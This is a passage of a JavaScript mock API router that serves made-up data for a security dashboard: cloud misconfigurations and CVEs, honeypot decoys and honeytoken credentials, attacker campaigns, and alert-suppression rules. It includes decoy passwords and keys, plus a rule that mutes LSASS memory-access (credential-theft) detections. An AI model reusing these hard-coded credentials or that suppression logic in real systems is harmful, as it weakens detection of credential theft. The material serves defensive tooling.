  if (p === '/cloud/compliance') return ok([{ framework: 'CIS', total: 87, passed: 66, failed: 21, score: 75.9 }, { framework: 'GDPR', total: 43, passed: 35, failed: 8, score: 81.4 }, { framework: 'HIPAA', total: 54, passed: 39, failed: 15, score: 72.2 }, { framework: 'ISO 27001', total: 62, passed: 51, failed: 11, score: 82.3 }, { framework: 'NIST', total: 71, passed: 58, failed: 13, score: 81.7 }, { framework: 'PCI DSS', total: 38, passed: 25, failed: 13, score: 65.8 }, { framework: 'SOC 2', total: 45, passed: 34, failed: 11, score: 75.6 }]);
  if (p === '/cloud/timeline') return ok([{ event_type: 'threat', title: 'Crypto mining detected on EC2', provider: 'aws', region: 'us-east-1', severity: 'critical', created_at: new Date(Date.now() - 300000).toISOString() }, { event_type: 'finding', title: 'S3 bucket made public', provider: 'aws', region: 'us-east-1', severity: 'critical', created_at: new Date(Date.now() - 10800000).toISOString() }, { event_type: 'drift', title: 'iam_policy_change', provider: 'aws', region: 'us-east-1', severity: 'high', created_at: new Date(Date.now() - 21600000).toISOString() }, { event_type: 'threat', title: 'Impossible travel detected', provider: 'azure', region: 'East US', severity: 'high', created_at: new Date(Date.now() - 1800000).toISOString() }, { event_type: 'finding', title: 'RDS encryption disabled', provider: 'aws', region: 'us-east-1', severity: 'high', created_at: new Date(Date.now() - 86400000 * 2).toISOString() }, { event_type: 'drift', title: 'security_group_modification', provider: 'aws', region: 'eu-west-1', severity: 'medium', created_at: new Date(Date.now() - 86400000 * 3).toISOString() }, { event_type: 'threat', title: 'New IAM user created unexpectedly', provider: 'aws', region: 'us-east-1', severity: 'critical', created_at: new Date(Date.now() - 14400000).toISOString() }]);
  if (p === '/cloud/attack-paths') return ok({ nodes: [{ id: 'internet', label: 'Internet', type: 'source', icon: 'globe' }, { id: 'asset-2', label: 'web-prod-01 (EC2)', type: 'ec2', provider: 'aws', risk: 78 }, { id: 'asset-1', label: 'corp-backups (S3)', type: 's3', provider: 'aws', risk: 95 }, { id: 'iam-1', label: 'BackupRole (IAM)', type: 'iam_role', permissions: 'AdministratorAccess' }, { id: 'iam-2', label: 'deploy-bot (IAM User)', type: 'iam_user', permissions: 'AdministratorAccess' }, { id: 'data-3', label: 'postgres-prod-01 (RDS)', type: 'rds', provider: 'aws', sensitive: true }, { id: 'data-4', label: 'analytics-bq (BigQuery)', type: 'bigquery', provider: 'gcp', sensitive: true }], edges: [{ source: 'internet', target: 'asset-2', label: 'HTTP/HTTPS', risk: 'high' }, { source: 'internet', target: 'asset-1', label: 'public bucket', risk: 'critical' }, { source: 'asset-2', target: 'iam-1', label: 'assumes role', risk: 'critical' }, { source: 'asset-2', target: 'iam-2', label: 'credential access', risk: 'critical' }, { source: 'iam-1', target: 'data-3', label: 'RDS access', risk: 'critical' }, { source: 'iam-2', target: 'asset-1', label: 'S3 admin', risk: 'critical' }, { source: 'iam-2', target: 'data-3', label: 'can access', risk: 'critical' }, { source: 'iam-2', target: 'data-4', label: 'cross-cloud pivot', risk: 'high' }] });
  if (p === '/cloud/drift') return ok([{ id: 1, resource_id: 'corp-backups', resource_type: 'S3 Bucket', change_type: 'public_bucket_exposure', previous_state: 'private', new_state: 'public', changed_by: 'deploy-bot', provider: 'aws', region: 'us-east-1', severity: 'critical', acknowledged: false, created_at: new Date(Date.now() - 10800000).toISOString() }, { id: 2, resource_id: 'arn:aws:iam::123456789012:role/BackupRole', resource_type: 'IAM Role', change_type: 'iam_policy_change', previous_state: 'S3ReadOnlyAccess', new_state: 'AdministratorAccess', changed_by: 'john.doe@corp.com', provider: 'aws', region: 'us-east-1', severity: 'critical', acknowledged: false, created_at: new Date(Date.now() - 21600000).toISOString() }, { id: 3, resource_id: 'sg-0a1b2c3d4e5f', resource_type: 'Security Group', change_type: 'security_group_modification', previous_state: '10.0.0.0/8:22', new_state: '0.0.0.0/0:22', changed_by: 'terraform-apply', provider: 'aws', region: 'eu-west-1', severity: 'high', acknowledged: false, created_at: new Date(Date.now() - 86400000 * 3).toISOString() }, { id: 4, resource_id: 'prod-cloudtrail', resource_type: 'CloudTrail', change_type: 'disabled_logging', previous_state: 'enabled', new_state: 'disabled', changed_by: 'unknown', provider: 'aws', region: 'eu-west-1', severity: 'high', acknowledged: true, created_at: new Date(Date.now() - 86400000 * 5).toISOString() }]);
  if (p === '/cloud/vulnerabilities') return ok([{ id: 1, category: 'cve', title: 'CVE-2024-21626 - runc container escape', description: 'Critical vulnerability in runc allowing container breakout affecting EKS nodes running containerd.', severity: 'critical', provider: 'aws', region: 'us-east-1', resource_type: 'eks', resource_id: 'k8s-prod', framework: 'NVD', created_at: new Date(Date.now() - 86400000 * 7).toISOString() }, { id: 2, category: 'missing_patch', title: 'EC2 instance running outdated Amazon Linux 2', description: 'web-prod-01 has 47 pending security patches, including 3 critical kernel vulnerabilities.', severity: 'high', provider: 'aws', region: 'us-east-1', resource_type: 'ec2', resource_id: 'i-0a1b2c3d4e5f67890', framework: 'AWS Inspector', created_at: new Date(Date.now() - 86400000 * 3).toISOString() }, { id: 3, category: 'container_vulnerability', title: 'nginx:1.19 base image with CVE-2021-23017', description: 'Container image uses vulnerable nginx version with DNS resolver buffer overflow (CVSS 9.4).', severity: 'critical', provider: 'aws', region: 'us-east-1', resource_type: 'eks', resource_id: 'k8s-prod/nginx-pod', framework: 'Trivy', created_at: new Date(Date.now() - 86400000 * 2).toISOString() }, { id: 4, category: 'package_vulnerability', title: 'Log4j 2.14.1 detected in lambda-payments', description: 'Lambda function dependencies include vulnerable Log4j version susceptible to JNDI injection (Log4Shell).', severity: 'critical', provider: 'aws', region: 'us-east-1', resource_type: 'lambda', resource_id: 'lambda-payments', framework: 'NVD', created_at: new Date(Date.now() - 86400000 * 1).toISOString() }]);
  if (p === '/cloud/threat-intel') return ok({ top_source_ips: [{ ip: '185.220.101.47', hits: 12, threat_types: 'crypto_mining, bucket_enumeration, data_exfiltration' }, { ip: '203.0.113.42', hits: 4, threat_types: 'impossible_travel, suspicious_api_calls' }, { ip: '10.0.1.44', hits: 3, threat_types: 'suspicious_api_calls' }], by_threat_type: [{ threat_type: 'suspicious_api_calls', count: 8, critical: 2 }, { threat_type: 'bucket_enumeration', count: 6, critical: 1 }, { threat_type: 'impossible_travel', count: 4, critical: 0 }, { threat_type: 'crypto_mining', count: 3, critical: 3 }, { threat_type: 'data_exfiltration', count: 2, critical: 2 }, { threat_type: 'new_iam_user', count: 1, critical: 1 }], by_provider: [{ provider: 'aws', count: 17 }, { provider: 'azure', count: 5 }, { provider: 'gcp', count: 2 }] });
  if (p === '/cloud/analytics') return ok({ top_exposed: [{ name: 'corp-backups', resource_type: 's3', provider: 'aws', risk_score: 95 }, { name: 'postgres-prod-01', resource_type: 'rds', provider: 'aws', risk_score: 82 }, { name: 'web-prod-01', resource_type: 'ec2', provider: 'aws', risk_score: 78 }], top_misconfigs: [{ category: 'weak_iam', total: 9, critical: 1 }, { category: 'missing_encryption', total: 6, critical: 0 }, { category: 'open_security_group', total: 5, critical: 0 }, { category: 'public_storage', total: 3, critical: 2 }], by_region: [{ region: 'us-east-1', assets: 98, avg_risk: 61 }, { region: 'eu-west-1', assets: 44, avg_risk: 53 }, { region: 'us-west-2', assets: 38, avg_risk: 41 }, { region: 'East US', assets: 73, avg_risk: 55 }], threat_trend: [{ date: '2026-07-09', count: 2 }, { date: '2026-07-10', count: 1 }, { date: '2026-07-11', count: 4 }, { date: '2026-07-12', count: 3 }, { date: '2026-07-13', count: 6 }, { date: '2026-07-14', count: 5 }, { date: '2026-07-15', count: 8 }, { date: '2026-07-16', count: 7 }], compliance_trend: [{ date: '2026-07-09', count: 15 }, { date: '2026-07-10', count: 12 }, { date: '2026-07-11', count: 18 }, { date: '2026-07-12', count: 9 }, { date: '2026-07-13', count: 14 }, { date: '2026-07-14', count: 11 }, { date: '2026-07-15', count: 7 }] });

  // ── Deception Enterprise ──────────────────────────────────────────────────
  if (p === '/deception/dashboard') return ok({ active_decoys: 12, triggered_decoys: 5, total_triggers: 47, active_campaigns: 2, high_risk_24h: 3, offline_decoys: 1, honeytokens_triggered: 4, active_honeytokens: 31, recent_triggers: [{ id: 1, event_type: 'ssh_login_attempt', attacker_ip: '185.220.101.47', attacker_user: 'root', severity: 'critical', created_at: new Date(Date.now() - 120000).toISOString(), decoy_name: 'DECOY-LINUX-01', token_name: '' }, { id: 2, event_type: 'rdp_connection', attacker_ip: '10.0.1.88', attacker_user: '', severity: 'high', created_at: new Date(Date.now() - 480000).toISOString(), decoy_name: 'DECOY-WIN-02', token_name: '' }, { id: 3, event_type: 'honeytoken_used', attacker_ip: '10.0.1.88', attacker_user: 'svc_backup', severity: 'critical', created_at: new Date(Date.now() - 900000).toISOString(), decoy_name: '', token_name: 'svc_backup_cred' }, { id: 4, event_type: 'smb_access', attacker_ip: '185.220.101.47', attacker_user: '', severity: 'high', created_at: new Date(Date.now() - 1800000).toISOString(), decoy_name: 'DECOY-FILESVR', token_name: '' }, { id: 5, event_type: 'ldap_query', attacker_ip: '10.0.1.88', attacker_user: 'svc_backup', severity: 'high', created_at: new Date(Date.now() - 3600000).toISOString(), decoy_name: 'DECOY-DC-01', token_name: '' }], trend: [{ date: '2026-07-02', count: 2 }, { date: '2026-07-03', count: 0 }, { date: '2026-07-04', count: 5 }, { date: '2026-07-05', count: 1 }, { date: '2026-07-06', count: 3 }, { date: '2026-07-07', count: 0 }, { date: '2026-07-08', count: 8 }, { date: '2026-07-09', count: 2 }, { date: '2026-07-10', count: 4 }, { date: '2026-07-11', count: 6 }, { date: '2026-07-12', count: 3 }, { date: '2026-07-13', count: 7 }, { date: '2026-07-14', count: 6 }] });
  if (p === '/deception/decoys') return ok([{ id: 1, name: 'DECOY-LINUX-01', type: 'honeypot', subtype: 'server', protocol: 'ssh', platform: 'linux', ip: '10.0.1.200', port: 22, location: 'DMZ', template: 'linux-ssh', status: 'active', health: 'online', trigger_count: 14, last_triggered: new Date(Date.now() - 120000).toISOString(), last_heartbeat: new Date(Date.now() - 60000).toISOString(), version: '2.3.1', integrity_ok: true, tags: 'dmz,linux,ssh', created_at: new Date(Date.now() - 86400000 * 14).toISOString() }, { id: 2, name: 'DECOY-WIN-02', type: 'honeypot', subtype: 'server', protocol: 'rdp', platform: 'windows', ip: '10.0.1.201', port: 3389, location: 'Internal LAN', template: 'windows-file-server', status: 'active', health: 'online', trigger_count: 8, last_triggered: new Date(Date.now() - 480000).toISOString(), last_heartbeat: new Date(Date.now() - 120000).toISOString(), version: '2.3.1', integrity_ok: true, tags: 'internal,windows,rdp', created_at: new Date(Date.now() - 86400000 * 10).toISOString() }, { id: 3, name: 'DECOY-FILESVR', type: 'honeypot', subtype: 'server', protocol: 'smb', platform: 'windows', ip: '10.0.1.202', port: 445, location: 'File Server Segment', template: 'windows-file-server', status: 'active', health: 'online', trigger_count: 12, last_triggered: new Date(Date.now() - 1800000).toISOString(), last_heartbeat: new Date(Date.now() - 180000).toISOString(), version: '2.3.1', integrity_ok: true, tags: 'fileshare,smb,windows', created_at: new Date(Date.now() - 86400000 * 7).toISOString() }, { id: 4, name: 'DECOY-DC-01', type: 'ad_object', subtype: 'domain_controller', protocol: 'ldap', platform: 'windows', ip: '10.0.1.203', port: 389, location: 'AD Segment', template: 'ad-domain-controller', status: 'active', health: 'online', trigger_count: 6, last_triggered: new Date(Date.now() - 3600000).toISOString(), last_heartbeat: new Date(Date.now() - 240000).toISOString(), version: '2.3.1', integrity_ok: true, tags: 'ad,ldap,dc', created_at: new Date(Date.now() - 86400000 * 5).toISOString() }, { id: 5, name: 'DECOY-DB-01', type: 'database', subtype: 'mssql', protocol: 'sql', platform: 'windows', ip: '10.0.1.204', port: 1433, location: 'DB Segment', template: 'sql-database', status: 'active', health: 'degraded', trigger_count: 3, last_triggered: new Date(Date.now() - 7200000).toISOString(), last_heartbeat: new Date(Date.now() - 1200000).toISOString(), version: '2.3.1', integrity_ok: false, tags: 'database,sql,mssql', created_at: new Date(Date.now() - 86400000 * 3).toISOString() }, { id: 6, name: 'DECOY-K8S-01', type: 'container', subtype: 'kubernetes', protocol: 'kubernetes_api', platform: 'linux', ip: '10.0.1.205', port: 6443, location: 'Cloud Segment', template: 'kubernetes-cluster', status: 'active', health: 'offline', trigger_count: 4, last_triggered: new Date(Date.now() - 14400000).toISOString(), last_heartbeat: new Date(Date.now() - 3600000).toISOString(), version: '2.2.0', integrity_ok: false, tags: 'cloud,k8s,container', created_at: new Date(Date.now() - 86400000 * 2).toISOString() }]);
  if (p === '/deception/honeytokens') return ok([{ id: 1, name: 'svc_backup_cred', type: 'credential', subtype: 'domain_user', value: 'svc_backup:B@ckup$ecure2024!', location: 'Domain: CORP\\svc_backup', owner: 'IT Operations', watchlist_category: 'privileged_accounts', triggered: true, trigger_count: 4, last_triggered: new Date(Date.now() - 900000).toISOString(), status: 'active', created_at: new Date(Date.now() - 86400000 * 21).toISOString() }, { id: 2, name: 'aws_prod_keys', type: 'cloud_credential', subtype: 'aws_access_key', value: 'AKIAIOSFODNN7EXAMPLE', location: 'S3: corp-backups/config/.aws/credentials', owner: 'DevOps', watchlist_category: 'cloud_credentials', triggered: false, trigger_count: 0, last_triggered: null, status: 'active', created_at: new Date(Date.now() - 86400000 * 14).toISOString() }, { id: 3, name: 'db_admin_password', type: 'credential', subtype: 'database_password', value: 'MSSQL SA: Pr0d@dm1n#2024', location: 'Share: \\\\FILESVR\\IT\\scripts\\deploy.ps1', owner: 'DBA Team', watchlist_category: 'database_credentials', triggered: true, trigger_count: 1, last_triggered: new Date(Date.now() - 3600000).toISOString(), status: 'active', created_at: new Date(Date.now() - 86400000 * 10).toISOString() }, { id: 4, name: 'payroll_spreadsheet', type: 'file', subtype: 'excel_document', value: '', location: 'Share: \\\\FILESVR\\Finance\\Payroll\\Q2-2026.xlsx', owner: 'Finance', watchlist_category: 'sensitive_documents', triggered: true, trigger_count: 2, last_triggered: new Date(Date.now() - 7200000).toISOString(), status: 'active', created_at: new Date(Date.now() - 86400000 * 7).toISOString() }, { id: 5, name: 'k8s_service_account', type: 'cloud_credential', subtype: 'k8s_secret', value: 'eyJhbGciOiJSUzI1NiJ9...', location: 'ConfigMap: default/app-config', owner: 'Platform Engineering', watchlist_category: 'cloud_credentials', triggered: false, trigger_count: 0, last_triggered: null, status: 'active', created_at: new Date(Date.now() - 86400000 * 5).toISOString() }, { id: 6, name: 'api_gateway_key', type: 'api_key', subtype: 'rest_api_key', value: 'sk-prod-a8f3x2b9c1d4e6f7a8b9c0d1e2f3g4h5', location: 'GitHub: corp-org/backend/src/config.py (line 42)', owner: 'Engineering', watchlist_category: 'api_credentials', triggered: false, trigger_count: 0, last_triggered: null, status: 'active', created_at: new Date(Date.now() - 86400000 * 3).toISOString() }]);
  if (p === '/deception/triggers') return ok([{ id: 1, event_type: 'ssh_login_attempt', attacker_ip: '185.220.101.47', attacker_user: 'root', source_host: 'unknown', severity: 'critical', responded: false, campaign_id: 1, created_at: new Date(Date.now() - 120000).toISOString(), decoy_name: 'DECOY-LINUX-01', decoy_type: 'honeypot', token_name: '', token_type: '' }, { id: 2, event_type: 'rdp_connection', attacker_ip: '10.0.1.88', attacker_user: '', source_host: 'WORKSTATION-05', severity: 'high', responded: false, campaign_id: 2, created_at: new Date(Date.now() - 480000).toISOString(), decoy_name: 'DECOY-WIN-02', decoy_type: 'honeypot', token_name: '', token_type: '' }, { id: 3, event_type: 'honeytoken_used', attacker_ip: '10.0.1.88', attacker_user: 'svc_backup', source_host: 'WORKSTATION-05', severity: 'critical', responded: true, campaign_id: 2, created_at: new Date(Date.now() - 900000).toISOString(), decoy_name: '', decoy_type: '', token_name: 'svc_backup_cred', token_type: 'credential' }, { id: 4, event_type: 'smb_access', attacker_ip: '185.220.101.47', attacker_user: '', source_host: 'unknown', severity: 'high', responded: false, campaign_id: 1, created_at: new Date(Date.now() - 1800000).toISOString(), decoy_name: 'DECOY-FILESVR', decoy_type: 'honeypot', token_name: '', token_type: '' }, { id: 5, event_type: 'ldap_query', attacker_ip: '10.0.1.88', attacker_user: 'svc_backup', source_host: 'WORKSTATION-05', severity: 'high', responded: true, campaign_id: 2, created_at: new Date(Date.now() - 3600000).toISOString(), decoy_name: 'DECOY-DC-01', decoy_type: 'ad_object', token_name: '', token_type: '' }]);
  if (p === '/deception/campaigns') return ok([{ id: 1, name: 'Operation Nightfall', attacker_ip: '185.220.101.47', attacker_user: '', decoys_hit: 3, tokens_triggered: 1, malware_family: 'CobaltStrike', status: 'active', severity: 'critical', mitre_techniques: 'T1110,T1046,T1021.001', started_at: new Date(Date.now() - 86400000).toISOString(), ended_at: null }, { id: 2, name: 'Insider Recon Alpha', attacker_ip: '10.0.1.88', attacker_user: 'svc_backup', decoys_hit: 2, tokens_triggered: 3, malware_family: '', status: 'active', severity: 'high', mitre_techniques: 'T1078,T1021.001,T1069', started_at: new Date(Date.now() - 43200000).toISOString(), ended_at: null }]);
  if (p === '/deception/timeline') return ok([{ id: 1, event_type: 'ldap_query', attacker_ip: '10.0.1.88', attacker_user: 'svc_backup', source_host: 'WORKSTATION-05', severity: 'high', created_at: new Date(Date.now() - 3600000).toISOString(), decoy_name: 'DECOY-DC-01', token_name: '', campaign_name: 'Insider Recon Alpha' }, { id: 2, event_type: 'rdp_connection', attacker_ip: '10.0.1.88', attacker_user: '', source_host: 'WORKSTATION-05', severity: 'high', created_at: new Date(Date.now() - 480000).toISOString(), decoy_name: 'DECOY-WIN-02', token_name: '', campaign_name: 'Insider Recon Alpha' }, { id: 3, event_type: 'honeytoken_used', attacker_ip: '10.0.1.88', attacker_user: 'svc_backup', source_host: 'WORKSTATION-05', severity: 'critical', created_at: new Date(Date.now() - 900000).toISOString(), decoy_name: '', token_name: 'svc_backup_cred', campaign_name: 'Insider Recon Alpha' }]);
  if (p === '/deception/graph') return ok({ nodes: [{ id: 'atk-185.220.101.47', label: '185.220.101.47', type: 'attacker', hits: 18 }, { id: 'atk-10.0.1.88', label: '10.0.1.88 (Internal)', type: 'attacker', hits: 9 }, { id: 'dec-1', label: 'DECOY-LINUX-01', type: 'decoy', subtype: 'honeypot', trigger_count: 14 }, { id: 'dec-2', label: 'DECOY-WIN-02', type: 'decoy', subtype: 'honeypot', trigger_count: 8 }, { id: 'dec-3', label: 'DECOY-FILESVR', type: 'decoy', subtype: 'honeypot', trigger_count: 12 }, { id: 'dec-4', label: 'DECOY-DC-01', type: 'decoy', subtype: 'ad_object', trigger_count: 6 }, { id: 'tok-1', label: 'svc_backup_cred', type: 'honeytoken', subtype: 'credential' }, { id: 'tok-3', label: 'db_admin_password', type: 'honeytoken', subtype: 'credential' }], edges: [{ source: 'atk-185.220.101.47', target: 'dec-1', label: 'ssh_login_attempt', severity: 'critical' }, { source: 'atk-185.220.101.47', target: 'dec-3', label: 'smb_access', severity: 'high' }, { source: 'atk-10.0.1.88', target: 'dec-4', label: 'ldap_query', severity: 'high' }, { source: 'atk-10.0.1.88', target: 'dec-2', label: 'rdp_connection', severity: 'high' }, { source: 'atk-10.0.1.88', target: 'tok-1', label: 'honeytoken_used', severity: 'critical' }, { source: 'atk-10.0.1.88', target: 'tok-3', label: 'honeytoken_used', severity: 'critical' }] });
  if (p === '/deception/threat-intel') { const qip = sp.get('ip') || '185.220.101.47'; return ok({ ip: qip, ip_reputation: 'malicious', confidence: 94, threat_actor: 'APT29 (Cozy Bear)', campaign: 'Operation Nightfall', malware_families: ['CobaltStrike', 'SUNBURST'], ttps: ['T1110', 'T1046', 'T1021.001', 'T1055', 'T1071.001'], ioc_matches: [{ type: 'ip', value: qip, source: 'AbuseIPDB' }, { type: 'ip', value: qip, source: 'ThreatFox' }], geo_country: 'Russia', geo_city: 'Moscow', asn: 'AS62370', org: 'Frantech Solutions', first_seen: '2025-01-14', last_seen: new Date().toISOString().split('T')[0], risk_score: 97, recommended_actions: ['Block at perimeter firewall immediately', 'Hunt for lateral movement from this source', 'Check all authentication logs for this IP', 'Notify threat intel team'] }); }
  if (p === '/deception/health') return ok({ decoys: [{ id: 1, name: 'DECOY-LINUX-01', type: 'honeypot', status: 'active', health: 'online', trigger_count: 14, last_triggered: new Date(Date.now() - 120000).toISOString(), last_heartbeat: new Date(Date.now() - 60000).toISOString(), version: '2.3.1', integrity_ok: true, location: 'DMZ' }, { id: 2, name: 'DECOY-WIN-02', type: 'honeypot', status: 'active', health: 'online', trigger_count: 8, last_triggered: new Date(Date.now() - 480000).toISOString(), last_heartbeat: new Date(Date.now() - 120000).toISOString(), version: '2.3.1', integrity_ok: true, location: 'Internal LAN' }, { id: 5, name: 'DECOY-DB-01', type: 'database', status: 'active', health: 'degraded', trigger_count: 3, last_triggered: new Date(Date.now() - 7200000).toISOString(), last_heartbeat: new Date(Date.now() - 1200000).toISOString(), version: '2.3.1', integrity_ok: false, location: 'DB Segment' }, { id: 6, name: 'DECOY-K8S-01', type: 'container', status: 'active', health: 'offline', trigger_count: 4, last_triggered: new Date(Date.now() - 14400000).toISOString(), last_heartbeat: new Date(Date.now() - 3600000).toISOString(), version: '2.2.0', integrity_ok: false, location: 'Cloud Segment' }], online: 9, offline: 1, degraded: 2 });
  if (p === '/deception/analytics') return ok({ top_decoys: [{ name: 'DECOY-LINUX-01', type: 'honeypot', trigger_count: 14 }, { name: 'DECOY-FILESVR', type: 'honeypot', trigger_count: 12 }, { name: 'DECOY-WIN-02', type: 'honeypot', trigger_count: 8 }, { name: 'DECOY-DC-01', type: 'ad_object', trigger_count: 6 }], top_tokens: [{ name: 'svc_backup_cred', type: 'credential', trigger_count: 4 }, { name: 'payroll_spreadsheet', type: 'file', trigger_count: 2 }, { name: 'db_admin_password', type: 'credential', trigger_count: 1 }], top_sources: [{ ip: '185.220.101.47', hits: 18 }, { ip: '10.0.1.88', hits: 9 }], by_event_type: [{ event_type: 'ssh_login_attempt', count: 14 }, { event_type: 'smb_access', count: 12 }, { event_type: 'rdp_connection', count: 8 }, { event_type: 'honeytoken_used', count: 7 }, { event_type: 'ldap_query', count: 6 }], daily: [{ date: '2026-07-09', count: 2 }, { date: '2026-07-10', count: 4 }, { date: '2026-07-11', count: 6 }, { date: '2026-07-12', count: 3 }, { date: '2026-07-13', count: 7 }, { date: '2026-07-14', count: 6 }, { date: '2026-07-15', count: 9 }, { date: '2026-07-16', count: 10 }] });
  if (p === '/deception/watchlists') return ok([{ id: 1, category: 'privileged_accounts', item: 'CORP\\svc_backup', item_type: 'ad_account', priority: 'critical', notes: 'Compromised honeytoken triggered 4 times', created_at: new Date(Date.now() - 900000).toISOString() }, { id: 2, category: 'threat_actors', item: '185.220.101.47', item_type: 'ip', priority: 'critical', notes: 'APT29-linked IP, hit 3 decoys', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 3, category: 'cloud_credentials', item: 'AKIAIOSFODNN7EXAMPLE', item_type: 'aws_key', priority: 'high', notes: 'Deployed in S3 decoy bucket', created_at: new Date(Date.now() - 86400000).toISOString() }]);
  if (p === '/deception/policies') return ok([{ id: 1, name: 'DMZ Rotation Policy', decoy_types: 'honeypot,ad_object', locations: 'DMZ,External Segment', lifetime_days: 30, rotation_days: 7, alert_threshold: 1, auto_cleanup: true, enabled: true, created_at: new Date(Date.now() - 86400000 * 30).toISOString() }, { id: 2, name: 'Internal Honeypot Policy', decoy_types: 'honeypot,database', locations: 'Internal LAN,DB Segment', lifetime_days: 60, rotation_days: 14, alert_threshold: 1, auto_cleanup: false, enabled: true, created_at: new Date(Date.now() - 86400000 * 14).toISOString() }]);
  if (p === '/deception/templates') return ok([{ id: 'windows-file-server', name: 'Windows File Server', type: 'server', protocol: 'smb', platform: 'windows', description: 'Mimics a Windows file server with enticing shares and documents' }, { id: 'linux-ssh', name: 'Linux SSH Server', type: 'server', protocol: 'ssh', platform: 'linux', description: 'Low-interaction SSH honeypot that logs all authentication attempts' }, { id: 'ad-domain-controller', name: 'Active Directory DC', type: 'ad_object', protocol: 'ldap', platform: 'windows', description: 'Fake Domain Controller with enticing privileged accounts' }, { id: 'sql-database', name: 'SQL Database', type: 'database', protocol: 'sql', platform: 'windows', description: 'Fake SQL server with realistic-looking database credentials' }, { id: 'web-application', name: 'Web Application', type: 'application', protocol: 'http', platform: 'linux', description: 'Fake web application with enticing admin panels and API endpoints' }, { id: 'kubernetes-cluster', name: 'Kubernetes Cluster', type: 'container', protocol: 'kubernetes_api', platform: 'linux', description: 'Fake Kubernetes API server to catch cloud-native attackers' }, { id: 'aws-environment', name: 'AWS Environment', type: 'cloud', protocol: 'api', platform: 'cloud', description: 'Fake AWS environment with enticing S3 buckets and IAM credentials' }, { id: 'azure-environment', name: 'Azure Environment', type: 'cloud', protocol: 'api', platform: 'cloud', description: 'Fake Azure environment with enticing storage accounts and secrets' }]);

  // ── Suppression Enterprise ───────────────────────────────────────────────
  if (p === '/sup/dashboard')   return ok({ active_rules: 12, suppressed_today: 1940, expiring_rules: 3, analyst_time_saved_h: 97, top_suppressed: [{ detection: 'Backup Process — PowerShell Execution', count: 4200, rule: 'Backup Window Suppression' }, { detection: 'Scheduled Task Created — SYSTEM', count: 1840, rule: 'Sysadmin Scheduled Tasks' }, { detection: 'LSASS Memory Access — Defender AV', count: 972, rule: 'AV Scanner False Positive' }, { detection: 'Network Scan — Vulnerability Scanner', count: 718, rule: 'Vuln Scanner Suppression' }, { detection: 'DNS Query — Windows Update', count: 612, rule: 'Windows Update Noise' }], suppression_trend: [{ date: '2026-07-11', suppressed: 1240, active_rules: 8 }, { date: '2026-07-12', suppressed: 1820, active_rules: 9 }, { date: '2026-07-13', suppressed: 980, active_rules: 9 }, { date: '2026-07-14', suppressed: 2140, active_rules: 11 }, { date: '2026-07-15', suppressed: 1760, active_rules: 11 }, { date: '2026-07-16', suppressed: 2080, active_rules: 12 }, { date: '2026-07-17', suppressed: 1940, active_rules: 12 }], analysts_creating_rules: [{ analyst: 'alice@corp.com', rules_created: 6, suppressed: 7200 }, { analyst: 'bob@corp.com', rules_created: 3, suppressed: 2840 }, { analyst: 'carol@corp.com', rules_created: 2, suppressed: 1920 }] });
  if (p === '/sup/rules')       return ok([
    { id: 1, rule_name: 'Backup Window Suppression', description: 'Suppress PowerShell execution alerts from backup servers during nightly backup window 02:00–06:00 UTC', status: 'active', owner: 'alice@corp.com', priority: 'medium', suppression_type: 'full_suppress', scope: 'asset_group', scope_value: 'Backup Servers', time_type: 'recurring_schedule', expires_at: null, conditions: JSON.stringify([{ field: 'process_name', op: 'matches', value: 'veeam*' }, { field: 'hostname', op: 'in_group', value: 'Backup Servers' }]), exceptions: JSON.stringify(['domain_controllers', 'critical_assets']), approval_status: 'not_required', approved_by: null, total_suppressed: 4200, last_triggered_at: new Date(Date.now() - 3600000).toISOString(), created_by: 'alice@corp.com', created_at: new Date(Date.now() - 30 * 86400000).toISOString(), updated_at: new Date(Date.now() - 2 * 86400000).toISOString() },
    { id: 2, rule_name: 'Sysadmin Scheduled Tasks', description: 'Suppress scheduled task creation alerts from known sysadmin accounts', status: 'active', owner: 'bob@corp.com', priority: 'medium', suppression_type: 'lower_severity', scope: 'department', scope_value: 'IT Operations', time_type: 'business_hours', expires_at: null, conditions: JSON.stringify([{ field: 'username', op: 'in', value: 'svc-deploy,svc-patch,svc-backup' }, { field: 'detection_name', op: 'equals', value: 'Scheduled Task Created — SYSTEM' }]), exceptions: JSON.stringify(['domain_controllers']), approval_status: 'not_required', approved_by: null, total_suppressed: 1840, last_triggered_at: new Date(Date.now() - 7200000).toISOString(), created_by: 'bob@corp.com', created_at: new Date(Date.now() - 45 * 86400000).toISOString(), updated_at: new Date(Date.now() - 5 * 86400000).toISOString() },
    { id: 3, rule_name: 'AV Scanner False Positive', description: 'Suppress LSASS memory access alerts generated by Windows Defender AV scanner process', status: 'active', owner: 'alice@corp.com', priority: 'low', suppression_type: 'group_duplicates', scope: 'entire_environment', scope_value: null, time_type: 'until_date', expires_at: new Date(Date.now() + 7 * 86400000).toISOString(), conditions: JSON.stringify([{ field: 'process_name', op: 'equals', value: 'MsMpEng.exe' }, { field: 'detection_name', op: 'contains', value: 'LSASS Memory Access' }]), exceptions: JSON.stringify(['critical_assets', 'threat_intel_match']), approval_status: 'not_required', approved_by: null, total_suppressed: 972, last_triggered_at: new Date(Date.now() - 900000).toISOString(), created_by: 'alice@corp.com', created_at: new Date(Date.now() - 20 * 86400000).toISOString(), updated_at: new Date(Date.now() - 1 * 86400000).toISOString() },
    { id: 4, rule_name: 'Vuln Scanner Suppression', description: 'Suppress network scan alerts from Qualys vulnerability scanner IP ranges', status: 'active', owner: 'carol@corp.com', priority: 'medium', suppression_type: 'full_suppress', scope: 'entire_environment', scope_value: null, time_type: 'recurring_schedule', expires_at: null, conditions: JSON.stringify([{ field: 'src_ip', op: 'in_range', value: '192.168.200.0/24' }, { field: 'detection_name', op: 'contains', value: 'Network Scan' }]), exceptions: JSON.stringify([]), approval_status: 'not_required', approved_by: null, total_suppressed: 718, last_triggered_at: new Date(Date.now() - 86400000).toISOString(), created_by: 'carol@corp.com', created_at: new Date(Date.now() - 60 * 86400000).toISOString(), updated_at: new Date(Date.now() - 10 * 86400000).toISOString() },
